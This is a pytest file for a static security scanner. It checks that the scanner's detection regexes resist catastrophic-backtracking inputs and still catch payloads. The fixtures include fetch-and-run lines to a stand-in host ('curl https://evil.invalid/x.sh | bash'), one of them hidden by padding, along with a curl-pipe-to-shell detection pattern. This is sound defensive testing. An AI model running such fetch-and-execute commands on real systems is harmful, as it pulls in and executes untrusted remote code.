"""Regex work in the built-in scanners stays bounded on hostile input.

A scanned repository is untrusted (fork PRs in CI), and Python's ``re`` cannot
be interrupted mid-match, so one crafted line that sends a pattern into
catastrophic backtracking hangs the whole scan. Each case below feeds a
hardened pattern the input shape that used to blow up and asserts it finishes
well inside a second, so a regression shows up as a test failure instead of a
stuck CI job.
"""

from __future__ import annotations

import re
import time
from pathlib import Path

import pytest

from nephilex.core.config import Config
from nephilex.core.plugin import ScannerContext
from nephilex.core.project import Project
from nephilex.scanners import (
    authz,
    cicd,
    cloud,
    container,
    iac,
    lang_sast,
    malware,
    patterns,
    secrets,
)
from nephilex.scanners._text import (
    CURL_PIPE_SHELL_RE,
    MAX_SCAN_LINE,
    iter_scan_lines,
    line_windows,
    search_line,
)

# Generous ceiling: the hardened patterns take milliseconds on these inputs,
# while the old ones took from seconds to hours.
BUDGET = 1.0


def _timed(fn) -> float:
    start = time.perf_counter()
    fn()
    return time.perf_counter() - start


def _malware(rule_id: str) -> re.Pattern[str]:
    return next(r.pattern for r in malware._RULES if r.id == rule_id)


def _pattern_rule(rule_id: str) -> re.Pattern[str]:
    return next(r.pattern for r in patterns.RULES if r.id == rule_id)


def _fit(unit: str) -> str:
    """Repeat ``unit`` up to the longest line a single search can see."""
    return (unit * (MAX_SCAN_LINE // len(unit) + 1))[:MAX_SCAN_LINE]


ADVERSARIAL = [
    (
        "malware curl-pipe-shell, spaces",
        _malware("malware.curl-pipe-shell"),
        "curl " + " " * (MAX_SCAN_LINE - 5),
    ),
    ("malware curl-pipe-shell, repeated curl", _malware("malware.curl-pipe-shell"), _fit("curl ")),
    ("malware data-exfil", _malware("malware.data-exfil-env"), "curl " + " " * (MAX_SCAN_LINE - 5)),
    (
        "malware reverse-shell python",
        _malware("malware.reverse-shell-bash"),
        "python -c '" + _fit("socket")[:-11],
    ),
    (
        "malware js-atob-eval",
        _malware("malware.js-atob-eval"),
        "atob(x)" + " " * (MAX_SCAN_LINE - 7),
    ),
    ("malware obfuscated-exec", _malware("malware.obfuscated-exec"), _fit("b64decode(x) ")),
    ("secrets assignment, repeated keyword", secrets._ASSIGNMENT, _fit("secret")),
    ("secrets assignment, long key", secrets._ASSIGNMENT, _fit("a_token_")),
    ("shared curl-pipe", CURL_PIPE_SHELL_RE, _fit("curl ")),
    # The repetition CodeQL's py/redos names for the optional sudo flags.
    ("shared curl-pipe, sudo flags", CURL_PIPE_SHELL_RE, "curl x | sudo " + _fit("-!\x7f- ")[:-14]),
    (
        "shared curl-pipe, sudo flags no space",
        CURL_PIPE_SHELL_RE,
        "curl x | sudo " + _fit("-!\x7f-")[:-14],
    ),
    ("lang-sast curl-pipe", lang_sast._RULES[".sh"][0][1], "curl " + " " * (MAX_SCAN_LINE - 5)),
    ("cicd hardcoded-secret", cicd._RULES[4][2], _fit("password:")),
    (
        "patterns sql f-string",
        _pattern_rule("python-sql-fstring"),
        'f"' + _fit(" select from {")[:-2],
    ),
    (
        "patterns sql f-string, many quotes",
        _pattern_rule("python-sql-fstring"),
        _fit('f"select from '),
    ),
    (
        "patterns sql format",
        _pattern_rule("python-sql-format"),
        'execute("' + _fit(' select "')[:-9],
    ),
    ("patterns path traversal", _pattern_rule("path-traversal-join"), _fit("open(input")),
    ("patterns js sql concat", _pattern_rule("js-sql-concat"), _fit("${a} x ")),
]


@pytest.mark.parametrize("label,pattern,text", ADVERSARIAL, ids=[a[0] for a in ADVERSARIAL])
def test_hardened_pattern_is_fast_on_adversarial_line(label, pattern, text):
    assert len(text) <= MAX_SCAN_LINE
    elapsed = _timed(lambda: pattern.search(text))
    assert elapsed < BUDGET, f"{label}: {elapsed:.2f}s"


def test_curl_pipe_sudo_flags_stay_linear_far_past_the_window():
    # The repetition CodeQL's py/redos names ('!\x7f-'), unwindowed and 50 times
    # longer than any single search normally sees, with no shell at the end so
    # every way of splitting the flags would be tried by a backtracking match.
    for unit in ("!\x7f-", "-!\x7f ", "-a\t", "- "):
        text = "curl x | sudo -" + unit * (50 * MAX_SCAN_LINE // len(unit)) + " !"
        elapsed = _timed(lambda text=text: CURL_PIPE_SHELL_RE.search(text))
        assert elapsed < BUDGET, f"{unit!r}: {elapsed:.2f}s"


def test_curl_pipe_matches_exactly_what_the_previous_spelling_matched():
    import random

    previous = re.compile(
        r"\b(?:curl|wget|fetch)\s+[^\s|][^\n|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z)?sh\b",
        re.IGNORECASE,
    )
    pieces = ["curl", "wget", "fetch", "sudo", "sh", "bash", "zsh", "|", "-", "--x", "-E"]
    pieces += [" ", "\t", " ", " ", "\x7f", "!", "a", "\n", "SUDO", "Sh"]
    rng = random.Random(20261024)
    samples = [
        "curl https://x.invalid/i.sh | sudo -E bash",
        "curl x | sudo --preserve-env -H sh",
        "curl x | sudo -u root sh",
        "curl x | sudo - sh",
        "wget -qO- x |sudo -E zsh",
    ]
    samples += ["".join(rng.choice(pieces) for _ in range(rng.randint(1, 30))) for _ in range(3000)]
    # Mostly well-formed pipes, so many samples reach the sudo flags.
    samples += [
        "curl x |"
        + "".join(rng.choice(pieces[3:]) for _ in range(rng.randint(0, 12)))
        + rng.choice(["sh", "bash", "zsh", " sh", "x"])
        for _ in range(3000)
    ]
    # Sudo with flags, separators and stray tokens mixed.
    flags = ["-E", "--x", "-!", "-\x7f", "-", "-a-b", "root", "!"]
    spaces = [" ", "\t", " ", " ", "", "  "]
    samples += [
        "curl x | sudo"
        + "".join(rng.choice(spaces) + rng.choice(flags) for _ in range(rng.randint(0, 6)))
        + rng.choice(spaces)
        + rng.choice(["sh", "bash", "-sh", "zsh!"])
        for _ in range(3000)
    ]
    for text in samples:
        old, new = previous.search(text), CURL_PIPE_SHELL_RE.search(text)
        assert (old and old.span()) == (new and new.span()), repr(text)


def test_long_lines_are_windowed_not_skipped():
    payload = "curl https://evil.invalid/x.sh | bash"
    line = " " * (MAX_SCAN_LINE * 3) + payload
    windows = line_windows(line)
    assert all(len(w) <= MAX_SCAN_LINE for w in windows)
    assert any(payload in w for w in windows)
    assert search_line(CURL_PIPE_SHELL_RE, line) is not None
    segs = list(iter_scan_lines(["short", line]))
    assert {n for n, _ in segs} == {1, 2}


def test_payload_on_a_window_boundary_is_still_seen():
    payload = "curl https://evil.invalid/x.sh | bash"
    # Place the payload so it straddles the first window's end.
    line = "x" * (MAX_SCAN_LINE - 10) + " " + payload + " " + "y" * MAX_SCAN_LINE
    assert search_line(CURL_PIPE_SHELL_RE, line) is not None


def _ctx(tmp_path: Path, files: dict[str, str]) -> ScannerContext:
    for name, body in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
    return ScannerContext(project=Project.from_path(tmp_path), config=Config())


def test_malware_scan_of_hostile_file_finishes(tmp_path):
    body = ("curl " + " " * 20000 + "\n") * 20 + "curl https://x.invalid/i.sh | sh\n"
    ctx = _ctx(tmp_path, {"install.sh": body})
    findings: list = []
    elapsed = _timed(lambda: findings.extend(malware.MalwareScanner().scan(ctx)))
    assert elapsed < 5 * BUDGET, f"{elapsed:.2f}s"
    hits = [f for f in findings if f.rule_id == "malware.curl-pipe-shell"]
    assert [f.location.start_line for f in hits] == [21]


def test_malware_finds_payload_hidden_by_padding(tmp_path):
    body = "x = 1  " + " " * 5000 + "curl https://evil.invalid/x.sh | bash\n"
    ctx = _ctx(tmp_path, {"run.sh": body})
    rules = [f.rule_id for f in malware.MalwareScanner().scan(ctx)]
    assert rules.count("malware.curl-pipe-shell") == 1


def test_iac_user_check_is_linear_on_blank_lines(tmp_path):
    ctx = _ctx(tmp_path, {"Dockerfile": "FROM python:3.12\n" + "\n" * 200_000})
    findings: list = []
    elapsed = _timed(lambda: findings.extend(iac.IaCScanner().scan(ctx)))
    assert elapsed < 5 * BUDGET, f"{elapsed:.2f}s"
    assert any(f.rule_id == "iac.docker-user-root" for f in findings)


def test_iac_user_directive_still_recognised(tmp_path):
    ctx = _ctx(tmp_path, {"Dockerfile": "FROM python:3.12\nUSER app\n"})
    rules = {f.rule_id for f in iac.IaCScanner().scan(ctx)}
    assert "iac.docker-user-root" not in rules


def test_cloud_iam_wildcard_has_no_whole_file_backtracking(tmp_path):
    ctx = _ctx(tmp_path, {"iam.tf": 'Action = "*"\n' * 50_000})
    findings: list = []
    elapsed = _timed(lambda: findings.extend(cloud.CloudScanner().scan(ctx)))
    assert elapsed < 5 * BUDGET, f"{elapsed:.2f}s"
    assert not any(f.rule_id == "cloud.iam-wildcard" for f in findings)


def test_cloud_iam_wildcard_reports_action_line(tmp_path):
    tf = (
        'resource "aws_iam_policy" "p" {\n'
        "  policy = jsonencode({\n"
        "    Statement = [{\n"
        '      Action   = "*"\n'
        '      Resource = "*"\n'
        "    }]\n"
        "  })\n"
        "}\n"
    )
    ctx = _ctx(tmp_path, {"iam.tf": tf})
    hits = [f for f in cloud.CloudScanner().scan(ctx) if f.rule_id == "cloud.iam-wildcard"]
    assert [f.location.start_line for f in hits] == [4]


def test_cloud_iam_wildcard_ignores_far_apart_statements(tmp_path):
    tf = 'Action = "*"\n' + "# filler\n" * 100 + 'Resource = "*"\n'
    ctx = _ctx(tmp_path, {"iam.tf": tf})
    assert not any(f.rule_id == "cloud.iam-wildcard" for f in cloud.CloudScanner().scan(ctx))


def test_authz_router_check_is_fast_and_correct():
    hostile = "APIRouter(dependencies=[" * 50_000
    elapsed = _timed(lambda: authz._has_router_auth(hostile))
    assert elapsed < 2 * BUDGET, f"{elapsed:.2f}s"
    assert authz._has_router_auth(
        'router = APIRouter(\n    prefix="/dependencies",\n'
        "    dependencies=[Depends(get_current_user)],\n)\n"
    )
    assert not authz._has_router_auth(
        "router = APIRouter(prefix='/x')\nx = dependencies=[Depends(a)]\n"
    )
    assert not authz._has_router_auth("router = APIRouter(dependencies=[])\nDepends(a)\n")


def test_container_cap_add_block_and_flow_forms(tmp_path):
    compose = (
        "services:\n  app:\n    image: app:1.0\n    cap_add:\n"
        "      - NET_ADMIN\n      - SYS_ADMIN\n  other:\n"
        '    cap_add: ["SYS_ADMIN"]\n'
    )
    ctx = _ctx(tmp_path, {"docker-compose.yml": compose})
    hits = [
        f for f in container.ContainerScanner().scan(ctx) if f.rule_id == "container.cap-sys-admin"
    ]
    assert sorted(f.location.start_line for f in hits) == [4, 8]


def test_container_cap_add_hostile_whitespace(tmp_path):
    compose = "cap_add:" + " " * 1990 + "x\n" + ("cap_add:\n" + " -\n" * 3) * 20_000
    ctx = _ctx(tmp_path, {"docker-compose.yml": compose})
    elapsed = _timed(lambda: list(container.ContainerScanner().scan(ctx)))
    assert elapsed < 5 * BUDGET, f"{elapsed:.2f}s"


def test_cicd_permissions_block_form_is_detected(tmp_path):
    wf = (
        "on: push\npermissions:\n  # repo-wide\n  contents: write\n"
        "jobs:\n  a:\n    permissions:\n      contents: read\n"
        "    runs-on: ubuntu-latest\n"
    )
    ctx = _ctx(tmp_path, {".github/workflows/ci.yml": wf})
    hits = [f for f in cicd.CicdScanner().scan(ctx) if f.rule_id == "cicd.excessive-permissions"]
    assert [f.location.start_line for f in hits] == [2]


def test_cicd_job_level_contents_write_is_least_privilege(tmp_path):
    wf = (
        "on: push\npermissions:\n  contents: read\n"
        "jobs:\n  deploy:\n    permissions:\n      contents: write\n"
        "    runs-on: ubuntu-latest\n"
        "  other:\n    permissions: write-all\n    runs-on: ubuntu-latest\n"
    )
    ctx = _ctx(tmp_path, {".github/workflows/ci.yml": wf})
    hits = [f for f in cicd.CicdScanner().scan(ctx) if f.rule_id == "cicd.excessive-permissions"]
    # The job that needs contents: write is not reported; write-all still is.
    assert [f.location.start_line for f in hits] == [10]


def test_patterns_scan_of_hostile_file_finishes(tmp_path):
    line = 'q = f"' + " select from" * 400 + '"\n'
    ctx = _ctx(tmp_path, {"app.py": line * 200})
    elapsed = _timed(lambda: list(patterns.PatternScanner().scan(ctx)))
    assert elapsed < 10 * BUDGET, f"{elapsed:.2f}s"


def test_secrets_scan_of_hostile_file_finishes(tmp_path):
    ctx = _ctx(tmp_path, {"cfg.py": ("secret" * 2000 + "\n") * 50})
    elapsed = _timed(lambda: list(secrets.SecretsScanner().scan(ctx)))
    assert elapsed < 10 * BUDGET, f"{elapsed:.2f}s"
